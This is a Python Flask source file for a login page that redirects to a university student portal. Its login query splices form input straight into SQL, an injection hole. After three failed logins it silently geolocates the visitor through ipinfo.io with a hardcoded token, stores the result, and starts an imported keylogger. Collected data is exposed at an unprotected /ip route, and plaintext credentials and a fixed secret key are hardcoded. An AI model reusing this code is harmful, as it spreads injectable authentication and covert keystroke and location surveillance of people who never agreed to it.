from flask import Flask, render_template, request, session, redirect, url_for
from keylogger import keylogger_main as Keylogger
import urllib.request, json
import sqlite3, os


app = Flask(__name__)
app.secret_key = 'secret_key'
app.database='data.db'


@app.route('/')
def home():
    if 'username' in session:
        return redirect('https://vtop.vit.ac.in/')
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    with sqlite3.connect(app.database) as connection:
        connection.row_factory = sqlite3.Row
        c = connection.cursor()
        c.execute("SELECT * FROM user WHERE username = '%s' AND password = '%s'" % (username, password))
        user = c.fetchone()

        if user:
            session['username'] = username
            session.pop('login_attempts', None)
            return redirect(url_for('home'))
    
    if 'login_attempts' not in session:
        session['login_attempts'] = 1
    else:
        session['login_attempts'] += 1
    
    if session['login_attempts'] >= 3:
        session.clear()
        url="https://ipinfo.io/json?token=7ed2eada64c65a"
        response = urllib.request.urlopen(url)
        data = json.load(response)
        with sqlite3.connect(app.database) as connection:
            connection.row_factory = sqlite3.Row
            c = connection.cursor()
            c.execute("INSERT INTO ip VALUES(?, ?, ?, ?, ?, ?, ?, ?)", (data['ip'], data['city'], data['region'], data['timezone'], data['country'], data['loc'], data['postal'], data['org']))
            connection.commit()
        Keylogger().run(5)

        return 'Maximum login attempts reached. Please try again later.'
    
    return render_template('index.html', error='Invalid username or password.', login_attempts=session['login_attempts'])

@app.route('/logout')
def logout():
    session.pop('username', None)
    session.pop('login_attempts', None)
    return redirect(url_for('home'))

@app.route('/ip')
def ip():
    with sqlite3.connect(app.database) as connection:
        connection.row_factory = sqlite3.Row
        c = connection.cursor()
        c.execute("SELECT * FROM ip")
        ip=c.fetchall()
        ip = [dict(ix) for ix in ip]

    return render_template('ip.html', ips=ip)


if __name__ == '__main__':
    if not os.path.exists(app.database):
        with sqlite3.connect(app.database) as connection:
            c = connection.cursor()
            c.execute("""CREATE TABLE ip(ip TEXT, city TEXT, region TEXT, timezone TEXT, country TEXT, loc TEXT, postal TEXT, org TEXT)""")
            c.execute("""CREATE TABLE user(username TEXT, password TEXT)""")
            c.execute('INSERT INTO user VALUES("admin", "password123")')
            c.execute('INSERT INTO user VALUES("rishabh", "20bit0047")')
            connection.commit()
    app.run(debug=True)